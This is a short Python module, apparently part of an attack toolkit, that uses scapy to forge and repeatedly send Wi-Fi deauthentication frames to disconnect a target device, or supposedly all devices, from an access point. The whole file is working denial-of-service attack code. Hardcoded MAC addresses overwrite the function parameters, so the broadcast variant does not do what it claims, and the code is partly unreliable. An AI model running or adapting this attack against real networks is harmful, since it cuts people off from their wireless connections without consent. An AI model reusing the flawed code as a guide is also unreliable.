from scapy.all import *
import logger


log = None
is_initialized = False


def module_init(main_log: logger.Logger):
    """
    initializes attack modules
    :param main_log: logger
    """
    global log, is_initialized
    log = main_log
    is_initialized = True


def wifi_deauth_host(target, gateway, persist=False):
    target = 'a4:4b:d5:c0:55:0a'
    gateway = 'b0:be:76:50:2e:25'
    log.log_info(f"starting wifi deauth target: {target}", True, True)
    dot11 = Dot11(addr1=target, addr2=gateway, addr3=gateway)
    frame = RadioTap() / dot11 / Dot11Deauth()

    while True:
        log.log_info(f"sending deauth packet", True, True)
        sendp(frame, count=100000, inter=0.90, verbose=False,  channel=7)
        if not persist:
            break


def wifi_deauth_all(gateway, persist=False):
    wifi_deauth_host(ETHER_BROADCAST, gateway, persist)
